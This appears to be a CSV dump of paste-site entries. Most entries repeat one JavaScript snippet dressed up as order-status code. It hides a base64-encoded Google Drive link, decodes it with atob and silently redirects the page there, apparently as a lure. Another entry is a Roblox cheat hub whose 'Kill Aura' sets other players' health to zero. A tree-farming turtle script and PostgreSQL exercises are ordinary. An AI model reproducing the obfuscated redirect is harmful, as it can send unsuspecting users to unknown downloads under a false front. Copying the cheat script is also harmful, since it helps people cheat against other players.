id,title,username,language,date,content
rentsidT,Market.js,Xp_Isolation,JavaScript,Wednesday 9th of April 2025 09:56:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11147/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8fjuy5hm,Untitled,Xp_Isolation,JavaScript,Wednesday 9th of April 2025 09:41:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/59985/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
S5knkXLz,Untitled,Ehieisaac123,Lua,Wednesday 9th of April 2025 09:36:34 PM CDT,"local Players = game:GetService(""Players"")
local player = Players.LocalPlayer
local gui = Instance.new(""ScreenGui"", player:WaitForChild(""PlayerGui""))
gui.Name = ""CassanoHub""

-- Yin-Yang Background
local bg = Instance.new(""ImageLabel"", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.Image = ""rbxassetid://11719621788"" -- Yin-Yang sky with moon (your uploaded visual)
bg.ImageTransparency = 0.3
bg.ZIndex = 0

-- Key Frame
local KeyFrame = Instance.new(""Frame"", gui)
KeyFrame.Size = UDim2.new(0, 300, 0, 200)
KeyFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
KeyFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
KeyFrame.Active = true
KeyFrame.Draggable = true
Instance.new(""UICorner"", KeyFrame)

local Title = Instance.new(""TextLabel"", KeyFrame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = ""Cassano Hub Key System""
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.BackgroundTransparency = 1

local KeyBox = Instance.new(""TextBox"", KeyFrame)
KeyBox.PlaceholderText = ""Enter Key...""
KeyBox.Size = UDim2.new(0.8, 0, 0, 30)
KeyBox.Position = UDim2.new(0.1, 0, 0.35, 0)
KeyBox.Text = """"
KeyBox.Font = Enum.Font.Gotham
KeyBox.TextSize = 16
KeyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
KeyBox.TextColor3 = Color3.new(1, 1, 1)

local GetKeyButton = Instance.new(""TextButton"", KeyFrame)
GetKeyButton.Text = ""Get Key""
GetKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
GetKeyButton.Position = UDim2.new(0.1, 0, 0.65, 0)
GetKeyButton.Font = Enum.Font.Gotham
GetKeyButton.TextSize = 14
GetKeyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
GetKeyButton.TextColor3 = Color3.new(1, 1, 1)
GetKeyButton.MouseButton1Click:Connect(function()
    setclipboard(""https://workink.net/1Z2m/r0bk16cn"")
end)

local CheckKeyButton = Instance.new(""TextButton"", KeyFrame)
CheckKeyButton.Text = ""Check Key""
CheckKeyButton.Size = UDim2.new(0.4, 0, 0, 30)
CheckKeyButton.Position = UDim2.new(0.5, 0, 0.65, 0)
CheckKeyButton.Font = Enum.Font.Gotham
CheckKeyButton.TextSize = 14
CheckKeyButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
CheckKeyButton.TextColor3 = Color3.new(1, 1, 1)

-- Main Hub Frame
local HubFrame = Instance.new(""Frame"", gui)
HubFrame.Size = UDim2.new(0, 600, 0, 400)
HubFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
HubFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
HubFrame.Visible = false
HubFrame.Active = true
HubFrame.Draggable = true
Instance.new(""UICorner"", HubFrame)

local HubTitle = Instance.new(""TextLabel"", HubFrame)
HubTitle.Size = UDim2.new(1, 0, 0, 30)
HubTitle.Text = ""Cassano Hub""
HubTitle.TextColor3 = Color3.new(1, 1, 1)
HubTitle.Font = Enum.Font.GothamBold
HubTitle.TextSize = 22
HubTitle.BackgroundTransparency = 1

-- Tabs
local Sections = {""Combat"", ""General"", ""Exploit"", ""Misc""}
local CurrentSection = ""Combat""
local Pages = {}

for i, sec in ipairs(Sections) do
    local tab = Instance.new(""TextButton"", HubFrame)
    tab.Size = UDim2.new(0, 140, 0, 25)
    tab.Position = UDim2.new(0, (i - 1) * 145, 0, 30)
    tab.Text = sec
    tab.Font = Enum.Font.Gotham
    tab.TextSize = 14
    tab.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    tab.TextColor3 = Color3.new(1, 1, 1)

    local page = Instance.new(""ScrollingFrame"", HubFrame)
    page.Size = UDim2.new(1, -20, 1, -65)
    page.Position = UDim2.new(0, 10, 0, 60)
    page.CanvasSize = UDim2.new(0, 0, 10, 0)
    page.ScrollBarThickness = 6
    page.BackgroundTransparency = 1
    page.Visible = sec == ""Combat""
    Pages[sec] = page

    local layout = Instance.new(""UIListLayout"", page)
    layout.Padding = UDim.new(0, 5)
    layout.SortOrder = Enum.SortOrder.LayoutOrder

    tab.MouseButton1Click:Connect(function()
        for _, p in pairs(Pages) do p.Visible = false end
        page.Visible = true
        CurrentSection = sec
    end)
end

-- Key Logic
local correctKey = ""cassano123""
CheckKeyButton.MouseButton1Click:Connect(function()
    if KeyBox.Text == correctKey then
        KeyFrame.Visible = false
        HubFrame.Visible = true
    else
        KeyBox.Text = """"
        KeyBox.PlaceholderText = ""Wrong key! Try again.""
    end
end)

-- Button Generator
local function makeButton(name, section, callback)
    local btn = Instance.new(""TextButton"")
    btn.Size = UDim2.new(1, -10, 0, 30)
    btn.Text = name
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Parent = Pages[section]
    btn.MouseButton1Click:Connect(callback)
end

-- COMBAT SECTION FEATURES
makeButton(""Kill Aura"", ""Combat"", function()
    while true do
        task.wait(0.3)
        for _, v in pairs(Players:GetPlayers()) do
            if v ~= player and v.Character and v.Character:FindFirstChild(""Humanoid"") then
                v.Character.Humanoid.Health = 0
            end
        end
    end
end)

makeButton(""Farsing"", ""Combat"", function()
    print(""Farsing Enabled (placeholder)"")
end)

makeButton(""Always Equip Fists"", ""Combat"", function()
    print(""Equipping fists"")
end)

makeButton(""Include NPCs"", ""Combat"", function()
    print(""NPCs included"")
end)

makeButton(""Player List"", ""Combat"", function()
    for _, v in pairs(Players:GetPlayers()) do
        print(v.Name)
    end
end)

makeButton(""Magnet Mode"", ""Combat"", function()
    print(""Magnet Mode On"")
end)

makeButton(""Magnet Distance: 2"", ""Combat"", function()
    print(""Magnet Distance Set"")
end)

makeButton(""Mithox Expander"", ""Combat"", function()
    print(""Mithox Expander Active"")
end)

makeButton(""Visible Check"", ""Combat"", function()
    print(""Checking visibility"")
end)

makeButton(""Mutbox Staw: 2"", ""Combat"", function()
    print(""Mutbox Set to 2"")
end)

makeButton(""Show Puthun"", ""Combat"", function()
    print(""Puthun Shown"")
end)

makeButton(""Ignore Friends"", ""Combat"", function()
    print(""Ignoring friends"")
end)

makeButton(""Attack Cooldown: 0.3"", ""Combat"", function()
    print(""Attack speed set to 0.3"")
end)

makeButton(""Attack Mode"", ""Combat"", function()
    print(""Toggled attack mode"")
end)

makeButton(""Enable Style Changer"", ""Combat"", function()
    print(""Style changer enabled"")
end)

makeButton(""Select Style: Jeet Kune Do"", ""Combat"", function()
    print(""Jeet Kune Do selected"")
end)

makeButton(""Weapon TP"", ""Combat"", function()
    print(""Weapon TP Triggered"")
end)
"
T2w1qeuT,Products.js,Xp_Isolation,JavaScript,Wednesday 9th of April 2025 09:25:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/99463/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
b4z1ezhN,tree,HappySunChild,Lua,Wednesday 9th of April 2025 09:11:00 PM CDT,"local MAX_HEIGHT = 50
local FUEL_THRESHOLD = MAX_HEIGHT * 2 + 20

local function forward()
	while not turtle.forward() do
		turtle.dig()
	end
end

local function hasItem(name)
	for slot = 1, 16 do
		local info = turtle.getItemDetail(slot)

		if info and info.name == name then
			return true
		end
	end

	return false
end

local function checkEnvironment()
	turtle.turnLeft()

	if not turtle.suck(4) then
		return false, ""Missing sapling storage!""
	end

	if not hasItem(""minecraft:spruce_sapling"") then
		return false, ""Non-sapling items in sapling storage!""
	end

	turtle.drop(4)

	turtle.turnRight()

	local exists, info = turtle.inspect()

	if not exists or info.name:match(""spruce"") then
		return false, ""Missing tree!""
	end

	return true
end

-- cycle functions

local function waitForTree()
	while true do
		local exists, block = turtle.inspect()

		if exists and block.name == ""minecraft:spruce_log"" then
			break
		end

		sleep(1)
	end
end

local function chop()
	forward()

	local y = 0

	while turtle.detectUp() do
		turtle.dig()
		turtle.turnRight()
		turtle.dig()
		turtle.turnLeft()

		turtle.digUp()
		turtle.up()

		if y > MAX_HEIGHT then
			break
		end

		y = y + 1
	end

	turtle.dig()

	turtle.turnRight()
	forward()
	turtle.turnLeft()
	forward()

	for _ = 1, y do
		turtle.digDown()
		turtle.down()
	end

	turtle.back()
	turtle.turnRight()
	turtle.back()
	turtle.turnLeft()
	turtle.back()
end

local function checkFuel()
	if turtle.getFuelLevel() > FUEL_THRESHOLD then
		return
	end

	for slot = 1, 16 do
		local info = turtle.getItemDetail(slot)

		if info then
			turtle.select(slot)

			local isCombustable = turtle.refuel(0)

			if isCombustable then
				turtle.refuel(16)
			end
		end
	end

	checkFuel()
end

local function dropoff()
	turtle.turnLeft()
	turtle.turnLeft()

	for slot = 1, 16 do
		local info = turtle.getItemDetail(slot)

		if info then
			turtle.select(slot)

			if info.name == ""minecraft:spruce_log"" then
				turtle.drop(info.count)
			else
				turtle.turnRight()
				turtle.drop(info.count)
				turtle.turnLeft()
			end
		end
	end

	turtle.select(1)

	turtle.turnRight()
	turtle.turnRight()
end

local function replant()
	turtle.turnLeft()
	turtle.suck(4)
	turtle.turnRight()

	forward()
	turtle.up()
	turtle.turnRight()

	for _ = 1, 3 do
		turtle.forward()
		turtle.placeDown()
		turtle.turnLeft()
	end

	forward()
	turtle.down()
	forward()

	turtle.turnRight()
	turtle.turnRight()

	turtle.place()
end

term.clear()
term.setCursorPos(1, 1)

print(""checking environment"")

local good, reason = checkEnvironment()

if not good then
	printError(reason)

	return
end

local cycles = 0

while true do
	print(""waiting for tree..."")
	waitForTree()

	print(""chop cycle "" .. cycles)
	chop()

	print(""checking fuel..."")
	checkFuel()

	dropoff()

	print(""replanting..."")
	replant()

	cycles = cycles + 1
end
"
ZverZScR,Order.js,Xp_Isolation,JavaScript,Wednesday 9th of April 2025 09:10:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24697/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
79ehR9hj,Market.js,Xp_Isolation,JavaScript,Wednesday 9th of April 2025 08:54:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35790/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
u1NW8F6K,Untitled,Xp_Isolation,JavaScript,Wednesday 9th of April 2025 08:39:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16011/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X77iRNBy,psql exercises,SX514LEFV,PostgreSQL,Wednesday 9th of April 2025 08:25:41 PM CDT,"DO $$
DECLARE
recordCount INTEGER;
totalCount INTEGER;
BEGIN
SELECT COUNT(*) INTO recordCount FROM jobs;
RAISE INFO 'Number of records in jobs table: %', recordCount;
totalCount = recordCount;
SELECT COUNT(*) INTO recordCount from categories;
RAISE INFO 'Number of records in categories table: %', recordCount;
totalCount = totalCount + recordCount;
SELECT COUNT(*) INTO recordCount from trailers;
RAISE INFO 'Number of records in trailers table: %', recordCount;
totalCount = totalCount + recordCount;
RAISE INFO 'Total number of records: %', totalCount;
END
$$;

DO $$
DECLARE
name VARCHAR(255);
age INTEGER;
person RECORD;
BEGIN
FOR person IN SELECT * FROM people ORDER by id LIMIT 130 LOOP
   age = (CURRENT_DATE-person.birthday)/365;
   name = person.name;
   IF person.birthday IS NOT NULL THEN 
	CASE
	WHEN person.deathday IS NOT NULL THEN 
		RAISE INFO '% was alive for % years', person.name, age;
	ELSE 
		RAISE INFO '% is alive for % years', person.name, age;
	END CASE;
   END IF;
END LOOP; 
END
$$;

DO $$
DECLARE
movie RECORD;
name VARCHAR(255);
theCount INTEGER = 0;
itCount INTEGER = 0;
anCount INTEGER = 0;
otherCount INTEGER = 0;
BEGIN
FOR movie IN SELECT * FROM movies WHERE kind = 'movie'
LOOP
	CASE
	WHEN STRPOS(movie.name, 'The ') = 1 OR movie.name = 'The' THEN
		theCount = theCount + 1;
	WHEN STRPOS(movie.name, 'It ') = 1 OR movie.name = 'It' THEN 
		itCount = itCount + 1;
	WHEN STRPOS(movie.name, 'A ') = 1 OR movie.name = 'A' OR STRPOS(movie.name, 'An ') = 1 OR movie.name = 'An' THEN
		anCount = anCount + 1;
	ELSE
		otherCount = otherCount + 1;
	END CASE;
END LOOP;
RAISE INFO 'Movies starting with The: %', theCount;
RAISE INFO 'Movies starting with It: %', itCount;
RAISE INFO 'Movies starting with A or An: %', anCount;
RAISE INFO 'Movies starting with other words: %', otherCount;
END
$$;"
Rj3LemEJ,Order.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 08:05:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77847/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1N2Ar2fi,Market.js,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 07:49:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60140/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XGbTwhrT,Untitled,rodrigomaise99,JavaScript,Wednesday 9th of April 2025 07:34:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69792/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
